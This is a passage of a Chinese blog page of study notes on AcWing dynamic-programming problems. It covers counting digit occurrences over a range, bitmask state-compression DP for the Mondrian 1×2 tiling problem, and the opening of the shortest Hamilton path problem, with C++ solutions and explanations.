style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1032</span></span></span></span>，则 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">a</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi></mrow><annotation encoding="application/x-tex">b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">b</span></span></span></span> 之间共有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>9</mn></mrow><annotation encoding="application/x-tex">9</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">9</span></span></span></span> 个数如下：</p><p><code>1024 1025 1026 1027 1028 1029 1030 1031 1032</code></p><p>其中 <code>0</code> 出现 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>10</mn></mrow><annotation encoding="application/x-tex">10</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">10</span></span></span></span> 次，<code>1</code> 出现 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>10</mn></mrow><annotation encoding="application/x-tex">10</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">10</span></span></span></span> 次，<code>2</code> 出现 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>7</mn></mrow><annotation encoding="application/x-tex">7</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">7</span></span></span></span> 次，<code>3</code> 出现 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>3</mn></mrow><annotation encoding="application/x-tex">3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">3</span></span></span></span> 次等等…</p><p><strong>输入格式</strong></p><p>输入包含多组测试数据。</p><p>每组测试数据占一行，包含两个整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">a</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi></mrow><annotation encoding="application/x-tex">b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">b</span></span></span></span>。</p><p>当读入一行为 <code>0 0</code> 时，表示输入终止，且该行不作处理。</p><p><strong>输出格式</strong></p><p>每组数据输出一个结果，每个结果占一行。</p><p>每个结果包含十个用空格隔开的数字，第一个数字表示 <code>0</code> 出现的次数，第二个数字表示 <code>1</code> 出现的次数，以此类推。</p><p><strong>数据范围</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>&lt;</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo>&lt;</mo><mn>100000000</mn></mrow><annotation encoding="application/x-tex">0 &lt; a,b &lt; 100000000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6835em;vertical-align:-0.0391em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">100000000</span></span></span></span></p><p><strong>输入样例：</strong></p><pre><code>1 1044 497346 5421199 17481496 14031004 5031714 1901317 8541976 4941001 19600 0</code></pre><p><strong>输出样例：</strong></p><pre><code>1 2 1 1 1 1 1 1 1 185 185 185 185 190 96 96 96 95 9340 40 40 93 136 82 40 40 40 40115 666 215 215 214 205 205 154 105 10616 113 19 20 114 20 20 19 19 16107 105 100 101 101 197 200 200 200 200413 1133 503 503 503 502 502 417 402 412196 512 186 104 87 93 97 97 142 196398 1375 398 398 405 499 499 495 488 471294 1256 296 296 296 296 287 286 286 247</code></pre><h3 id="计数问题硬上法">计数问题硬上法</h3><blockquote><p>此题不给出数位DP解法：感觉不如硬上直接、简单<br>数位DP解法可参考：<a href="https://www.acwing.com/solution/content/4934/">用提高课的方式打开基础课acwing338计数问题</a></p></blockquote><p><strong>技巧1</strong> [L, R] -&gt; f(L, i) - f(R - 1， i), f(n, i)为求1～n数字i个数的函数</p><p><strong>技巧2</strong> f(n, i) -&gt; <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mo>∑</mo><mi>x</mi><mi>x</mi><mi>x</mi><mo>&lt;</mo><mi>d</mi><mi>j</mi><mo>&gt;</mo><mi>y</mi><mi>y</mi><mi>y</mi><mo separator="true">,</mo><mtext> </mtext><mi>i</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(\sum xxx&lt;dj&gt;yyy,\ i)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mop op-symbol small-op" style="position:relative;top:0em;">∑</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">xxx</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">d</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">yyy</span><span class="mpunct">,</span><span class="mspace"> </span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">i</span><span class="mclose">)</span></span></span></span>, 即问题转化为求数字1～n的第j位上的数字i个数<br>&lt;leftPart&gt;&lt;dj&gt;&lt;rightPart&gt;是n的十进制展开，xxx和yyy都不特指3位数，其位数应当分别与&lt;leftPart&gt;和&lt;rightPart&gt;对应，dj是展开数中第j位的数字</p><p><strong>技巧3</strong> 按xxx大分类讨论：求xxx&lt;dy&gt;yyy形式的数中，数字i在第j位的出现次数</p><ol><li><p>xxx &lt; &lt;leftPart&gt;</p><ol><li><p>若i不为0，xxx可取000 ~ &lt;leftPart&gt; - 1，有<code>&lt;leftPart&gt; * p</code>种，p = pow(10, j)</p></li><li><p>若i等于0，xxx可取001 ~ &lt;leftPart&gt; - 1，有<code>(&lt;leftPart&gt; - 1) * p</code>种</p><blockquote><p>当i = 0时，当&lt;dj&gt; = 0时，xxx不能为0（不能有前导0，否则11也能按0011算，给0加数量）</p></blockquote></li></ol></li><li><p>xxx = &lt;leftPart&gt;</p><ol><li>i &lt; dj时 yyy : 000 ~ 9…9 即<code>p</code>种选法</li><li>i = dj时 yyy : 000 ~ &lt;rightPart&gt; 即<code>&lt;rightPart&gt; + 1</code> 种</li><li>i &gt; dj时 0种选法</li></ol></li><li><p>xxx &gt; &lt;leftPart&gt; 超出范围</p></li></ol><blockquote><p>下面做法很重要的一个问题是<code>else res += (left - 1) * p; </code>会在<code>i = 0, left = 0</code>时也会执行<br>但是由于<code>if (dj &gt; i) res += p</code>也未判断<code>i </code>和<code>left</code>是否同时为0（不能同时为0，同时为0是不合法的）<br>因此，这样抵消之后恰好计算正确</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cmath&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getDigit</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> (n) &#123;</span><br><span class="line">    res++;</span><br><span class="line">    n /= <span class="number">10</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">count</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> i)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 不要把求n的位数, 求第j位数字都放在一个函数中: 求n位数时会将n归零</span></span><br><span class="line">  <span class="type">int</span> res = <span class="number">0</span>, dgt = <span class="built_in">getDigit</span>(n);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> j = dgt - <span class="number">1</span>; ~j; j--) &#123;  <span class="comment">// ~j表示</span></span><br><span class="line">    <span class="type">int</span> p = <span class="built_in">pow</span>(<span class="number">10</span>, j);</span><br><span class="line">    <span class="type">int</span> left = n / p / <span class="number">10</span>, right = n % p, dj = n / p % <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">if</span> (i) res += left * p;</span><br><span class="line">    <span class="keyword">else</span> res += (left - <span class="number">1</span>) * p;  </span><br><span class="line">    <span class="keyword">if</span> (dj &gt; i) res += p;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (dj == i) res += right + <span class="number">1</span>;  <span class="comment">// 左边取xxx, dj=i时,右边可取000~right</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> l, r;</span><br><span class="line">  <span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;l, &amp;r), l || r) &#123;</span><br><span class="line">    <span class="keyword">if</span> (l &gt; r) <span class="built_in">swap</span>(l, r);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; i++) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, <span class="built_in">count</span>(r, i) - <span class="built_in">count</span>(l - <span class="number">1</span>, i));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="状态压缩DP">状态压缩DP</h1><blockquote><p>状态压缩:用（二进制）整数表示一个状态。</p></blockquote><h2 id="AcWing-291-蒙德里安的梦想"><a href="https://www.acwing.com/activity/content/code/content/64200/">AcWing 291. 蒙德里安的梦想</a></h2><p><code>难度：中等</code></p><p>求把 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi><mo>×</mo><mi>M</mi></mrow><annotation encoding="application/x-tex">N \times M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span> 的棋盘分割成若干个 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>×</mo><mn>2</mn></mrow><annotation encoding="application/x-tex">1 \times 2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">2</span></span></span></span> 的长方形，有多少种方案。</p><p>例如当 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi><mo>=</mo><mn>2</mn><mtext>，</mtext><mi>M</mi><mo>=</mo><mn>4</mn></mrow><annotation encoding="application/x-tex">N=2，M=4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord">2</span><span class="mord cjk_fallback">，</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">4</span></span></span></span> 时，共有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>5</mn></mrow><annotation encoding="application/x-tex">5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">5</span></span></span></span> 种方案。当 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi><mo>=</mo><mn>2</mn><mtext>，</mtext><mi>M</mi><mo>=</mo><mn>3</mn></mrow><annotation encoding="application/x-tex">N=2，M=3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord">2</span><span class="mord cjk_fallback">，</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">3</span></span></span></span> 时，共有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>3</mn></mrow><annotation encoding="application/x-tex">3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">3</span></span></span></span> 种方案。</p><p>如下图所示：</p><p><img src="/2022/11/21/%E7%AE%97%E6%B3%95-AcWing%E7%AE%97%E6%B3%95%E5%9F%BA%E7%A1%80%E8%AF%BE-5-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20221125190249113.png" alt="image-20221125190249113"></p><p><strong>输入格式</strong></p><p>输入包含多组测试用例。</p><p>每组测试用例占一行，包含两个整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span>。</p><p>当输入用例 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi><mo>=</mo><mn>0</mn><mtext>，</mtext><mi>M</mi><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">N=0，M=0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord">0</span><span class="mord cjk_fallback">，</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span> 时，表示输入终止，且该用例无需处理。</p><p><strong>输出格式</strong></p><p>每个测试用例输出一个结果，每个结果占一行。</p><p><strong>数据范围</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>N</mi><mo separator="true">,</mo><mi>M</mi><mo>≤</mo><mn>11</mn></mrow><annotation encoding="application/x-tex">1 \le N,M \le 11</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">11</span></span></span></span></p><p><strong>输入样例：</strong></p><pre><code>1 21 31 42 22 32 42 114 110 0</code></pre><p><strong>输出样例：</strong></p><pre><code>10123514451205</code></pre><h3 id="状态压缩dp-预处理">状态压缩dp + 预处理</h3><p>思考：</p><ol><li>先放横放方块，而后纵放小方块的方案唯一确定<br>即：总方案数 = 只放横向小方块的数量</li><li>判断是否合法？<br>按列看，1、连续两列同行小方块不冲突；2、每列内部所有连续空着的小方块需要是偶数个。</li></ol><p>DP：</p><ul><li><p>状态表示<code>f[i][j]</code></p><ul><li>集合 已将前<code>i - 1</code>列摆好，且从<code>i - 1</code>列伸到第<code>i</code>列的状态是<code>j</code>的方案<br>j为一个二进制数，范围是0～n的二进制范围；</li><li>属性 Num</li></ul></li><li><p>状态计算</p><ul><li><p>按照<code>i - 1</code>列的状态<code>k</code>进行分类</p></li><li><p><code>f[i - 1][k]</code>需要满足</p><ol><li>(j &amp; k) == 0 (同一行连续两列不能都放小方块)</li><li>所有连续空着位置的长度必须为偶数 <code>st[j | k]</code></li></ol><blockquote><p>考虑状态j可能由哪些状态k转移过来，这个k是第i-1层的问题</p><p>第i-1列是否满足第2点要看两个状态：j和k<br>j是在i-1层放置的小方块伸出来导致的，k是i-2列小方块伸出的</p></blockquote></li></ul></li></ul><p>补充：</p><ul><li>列下标从0开始，最终状态<code>f[m][0]</code></li><li>预处理计算st和states时不能放在while循环外<br>因为st是根据n的变化而变化的，以st[0]为例，st[0]表示的是状态为0时，是否有连续奇数个空格子，如果n=1那么棋盘总共只有1行，状态为0时只有1个连续空格，此时st[0]=false;如果n=2，则棋盘上有两行，状态为00，有两个空格子，所以st[0]=true</li></ul><ul><li>初始化：<code>f[0][0] = 1;</code><br>第0列其实是不存在的，你可以认为它是为了后面DP公式能正确递推而创造出来的，同时它的摆法也不能插入到第1列影响后续的摆法，所以它的摆法只能是竖放1种。从递推的结果看，这样初始化为1也是正确的。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span>  <span class="comment">// memset()在C中在&lt;string.h&gt;，C++中在&lt;cstring&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">12</span>, kM = <span class="number">1</span> &lt;&lt; kN;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> st[kM];  <span class="comment">// st[j]: 在n行时, 状态j是否合法</span></span><br><span class="line">vector&lt;<span class="type">int</span>&gt; states[kM];  <span class="comment">// states[j]: 哪些状态k可以转移到状态j</span></span><br><span class="line"><span class="comment">// vector&lt;vector&lt;int&gt;&gt; states(kN); 与上一句等价</span></span><br><span class="line"><span class="type">long</span> <span class="type">long</span> f[kN][kM];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> n, m;</span><br><span class="line">  <span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;m), n || m) &#123;</span><br><span class="line">    <span class="comment">// 预处理1: 对于每种状态，先预处理每列不能有奇数个连续的0</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; (<span class="number">1</span> &lt;&lt; n); i++) &#123;</span><br><span class="line">      st[i] = <span class="literal">true</span>;</span><br><span class="line">      <span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;&gt; j &amp; <span class="number">1</span>) &#123;</span><br><span class="line">          <span class="keyword">if</span> (cnt &amp; <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="comment">// st[i] = false;</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="comment">// cnt = 0;</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          cnt++;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (cnt &amp; <span class="number">1</span>) st[i] = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 预处理2: 求到状态j的所有合法状态</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; (<span class="number">1</span> &lt;&lt; n); j++) &#123;</span><br><span class="line">      states[j].<span class="built_in">clear</span>();</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; (<span class="number">1</span> &lt;&lt; n); k++) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((j &amp; k) == <span class="number">0</span> &amp;&amp; st[j | k]) &#123;  <span class="comment">// ==较&amp;优先</span></span><br><span class="line">          states[j].<span class="built_in">push_back</span>(k);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">memset</span>(f, <span class="number">0</span>, <span class="keyword">sizeof</span> f);</span><br><span class="line">    f[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">1</span>;  <span class="comment">// ?</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= m; i++) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; (<span class="number">1</span> &lt;&lt; n); j++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> k: states[j]) &#123;</span><br><span class="line">          f[i][j] += f[i - <span class="number">1</span>][k];</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>, f[m][<span class="number">0</span>]);  <span class="comment">// 打印用%lld</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="AcWing-91-最短Hamilton路径"><a href="https://www.acwing.com/activity/content/problem/content/1011/">AcWing 91. 最短Hamilton路径</a></h2><p><code>难度：中等</code></p><p>给定一张 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 个点的带权无向图，点从 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>∼</mo><mi>n</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">0 \sim n-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∼</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> 标号，求起点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span> 到终点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">n-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" 